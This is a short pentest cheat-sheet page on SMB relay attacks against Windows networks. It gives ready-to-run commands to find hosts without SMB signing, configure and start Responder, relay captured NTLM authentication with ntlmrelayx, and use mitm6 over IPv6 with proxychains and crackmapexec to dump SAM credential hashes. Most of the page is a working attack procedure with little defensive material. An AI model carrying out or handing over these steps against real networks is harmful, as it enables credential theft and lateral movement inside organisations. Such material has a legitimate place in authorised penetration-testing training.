# SMB Relay

## What is SMB relay?

SMB relay attack is just relaying those credentials you capture with responder like, in the LLMNR Poisoning but this time you authenticate with those in other machines.

### Requirements

* SMB Signing needs to be disabled on target
* User must have elevated privileges in the machine, like local admin, domain administrator, member of, and the group etc.

### What is SMB Signing?

* SMB Signing verify the authenticity and origin of the SMB packets. Prevents SMB MiTM attacks effectively.

### Check SMB Signing

* You can use Crackmapexec and Nmap to scan the entire network for SMB signing to make much easier the job.&#x20;

#### Crackmapexec

Use this command and see the results.

```java
crackmapexec smb <ip-address>
```

#### Nmap

* Nmap haves a script to verify if SMB is signed or not. Use the following command and see the results.

```java
nmap --script=smb2-security-mode.nse -p 445,139 192.168.64.129 -Pn --open
```

### How to perform the attack (Ipv4)

First, we need to configure the responder, just change **SMB** and **HTTP** to **Off**:

```javascript
[Responder Core]

; Servers to start
SQL = On
SMB = Off
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WINRM = On
```

We do not want to respond to these protocols as we will be capturing the hash and relaying it to a different tool called **ntlmrelayx.py** from **Impacket**.

#### Starting responder

```bash
sudo python Responder.py -I eth0 -v
```

Later than, call **ntlmrelayx.py**:

```bash
sudo python ntlmrelayx.py -t 192.168.1.11 -smb2support
```

### SMB Relay using Ipv6

* <pre class="language-java"><code class="lang-java"><strong>mitm6 -d domain-name.local
  </strong>ntlmrelayx.py -6 -wh &#x3C;target-ip> -t smb://&#x3C;target-ip> -socks -debug -smb2support

  <strong># Once you have credentials with a TRUE status use proxychains to relay the credentials.
  </strong><strong>
  </strong><strong>proxychains cme smb &#x3C;target-ip> -u &#x3C;User> -p 'whateveryouwant' -d 'domaincorp' --sam 2>/dev/null
  </strong>
  </code></pre>

